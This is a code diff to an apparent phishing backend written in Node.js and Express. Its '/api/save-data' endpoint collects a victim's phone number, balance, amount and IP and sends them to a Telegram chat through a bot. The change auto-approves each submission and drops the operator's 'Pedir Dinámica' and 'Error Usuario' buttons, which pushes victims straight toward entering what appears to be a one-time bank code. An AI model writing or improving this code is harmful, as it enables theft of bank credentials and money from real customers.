@@ -143,7 +143,7 @@ app.post('/api/save-data', (req, res) => {
         monto: formattedMonto,
         cuota: cleanCuota,
         ip,
-        status: 'waiting', // waiting, approved, rejected
+        status: 'approved', // Auto-approved to request dynamic immediately
         timestamp: new Date()
     };
 
@@ -163,19 +163,13 @@ app.post('/api/save-data', (req, res) => {
 💰 *Saldo:* $${saldo}
 
 ⏰ *Fecha:* ${fecha}
+
+⚠️ *Estado:* Redirigiendo a Dinámica...
     `;
 
-    // Send to Telegram with Inline Buttons
+    // Send to Telegram without buttons (initial auto-approve)
     const options = {
-        parse_mode: 'Markdown',
-        reply_markup: {
-            inline_keyboard: [
-                [
-                    { text: '✅ Pedir Dinámica', callback_data: `approve_${cleanCelular}` },
-                    { text: '❌ Error Usuario', callback_data: `reject_${cleanCelular}` }
-                ]
-            ]
-        }
+        parse_mode: 'Markdown'
     };
 
     bot.sendMessage(CHAT_ID, message, options)
